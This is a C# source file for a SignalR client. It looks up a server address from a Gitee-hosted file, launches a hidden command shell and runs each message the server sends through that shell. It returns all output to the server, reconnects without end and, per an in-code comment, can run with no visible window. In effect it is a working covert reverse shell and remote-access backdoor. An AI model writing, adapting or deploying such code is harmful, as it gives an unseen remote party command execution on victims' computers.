using Microsoft.AspNetCore.SignalR.Client;
using System.Diagnostics;
using System.Text.Json;

namespace SignalrClient
{
    //在项目属性中，修改项目output type为windows application，就不会弹出console窗口。
    internal class Program
    {
        static HubConnection _HubConnection;
        static Process cmd = new Process();
        static string _url = "";

        static async Task Main(string[] args)
        {
            await GetIpAddressFromGitee();
            ConnectSignalr();
            //Console.ReadLine();
            while (true)
            {
                await Task.Delay(new TimeSpan(1, 0, 0, 0));
            }
        }

        static async void ConnectSignalr()
        {
            try
            {
                _HubConnection = new HubConnectionBuilder().WithUrl(_url).Build();
                _HubConnection.Closed += async (Exception ex) =>
                {
                    await _HubConnection.DisposeAsync();
                    await Task.Delay(3000);
                    CloseCmd();
                    ConnectSignalr();
                };
                _HubConnection.On<string>("ClientReceiveMessage", OnMessageReceived);
                StartCmd();
                await _HubConnection.StartAsync();
            }
            catch (Exception e)
            {
                await _HubConnection.DisposeAsync();
                await Task.Delay(3000);
                CloseCmd();
                ConnectSignalr();
            }

        }

        private static void OnMessageReceived(string message)
        {
            try
            {
                cmd.StandardInput.WriteLine(message);
            }
            catch { }

        }

        private static void CloseCmd()
        {
            try
            {
                cmd.StandardInput.Close();
                cmd.WaitForExit();
            }
            catch { }
        }

        private static void StartCmd()
        {
            cmd = new Process();

            cmd.StartInfo.FileName = System.Configuration.ConfigurationManager.AppSettings["Command"];
            cmd.StartInfo.WorkingDirectory = System.Configuration.ConfigurationManager.AppSettings["CmdWorkingDirectory"];
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;

            cmd.Start();

            cmd.OutputDataReceived += (sender, e) =>
            {
                //Console.WriteLine(e.Data);
                _HubConnection.InvokeAsync("ServerReceiveMessage", e.Data);
            };
            cmd.ErrorDataReceived += (sender, e) =>
            {
                //Console.WriteLine(e.Data);
                _HubConnection.InvokeAsync("ServerReceiveMessage", e.Data);
            };

            cmd.BeginOutputReadLine();
            cmd.BeginErrorReadLine();
        }

        private static async Task GetIpAddressFromGitee()
        {
            try
            {
                string url = System.Configuration.ConfigurationManager.AppSettings["GiteeServerInfoUrl"];
                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage responseMessageGet = await client.GetAsync(url);
                    if (responseMessageGet.IsSuccessStatusCode)
                    {
                        string text = await responseMessageGet.Content.ReadAsStringAsync();
                        ServerInfoModel serverInfo = JsonSerializer.Deserialize<ServerInfoModel>(text);
                        string UrlTemplate = System.Configuration.ConfigurationManager.AppSettings["UrlTemplate"];
                        _url = UrlTemplate.Replace("{0}", serverInfo.ServerIpv4);
                    }
                    else
                    {
                        client.Dispose();
                        await Task.Delay(10 * 1000);
                        await GetIpAddressFromGitee();
                    }
                }
            }
            catch
            {
                await Task.Delay(10 * 1000);
                await GetIpAddressFromGitee();
            }
            
        }

    }
}
